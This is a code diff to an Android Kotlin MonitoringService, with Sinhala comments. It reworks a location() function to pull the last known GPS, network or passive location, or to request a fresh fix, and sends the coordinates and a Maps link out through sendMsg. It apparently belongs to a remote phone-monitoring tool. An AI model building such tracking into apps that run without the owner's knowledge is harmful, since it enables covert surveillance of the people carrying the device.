@@ -286,14 +286,32 @@ class MonitoringService : LifecycleService() {
     }
 
     private fun location() {
-        try {
-            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-            if (loc == null) { sendMsg("❌ No location"); return }
+    try {
+        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+        // Cache එකේ බලන්න
+        var loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
+
+        if (loc != null) {
             val link = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
             sendMsg("📍 Location\nLat: ${loc.latitude}\nLng: ${loc.longitude}\nAccuracy: ${loc.accuracy}m\n\n$link")
-        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
+        } else {
+            sendMsg("📍 No cached location. GPS එකට ටිකක් ඉන්න.\n\nTry again in 30s.")
+            // Fresh fix request කරන්න
+            try {
+                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, object : android.location.LocationListener {
+                    override fun onLocationChanged(l: android.location.Location) {
+                        val link = "https://maps.google.com/?q=${l.latitude},${l.longitude}"
+                        sendMsg("📍 Location\nLat: ${l.latitude}\nLng: ${l.longitude}\n\n$link")
+                    }
+                    override fun onProviderEnabled(p: String) {}
+                    override fun onProviderDisabled(p: String) {}
+                    override fun onStatusChanged(p: String?, s: Int, e: android.os.Bundle?) {}
+                }, mainLooper)
+            } catch (_: Exception) {}
+        }
+    } catch (e: Exception) { sendMsg("❌ ${e.message}") }
     }
 
     private fun battery() {
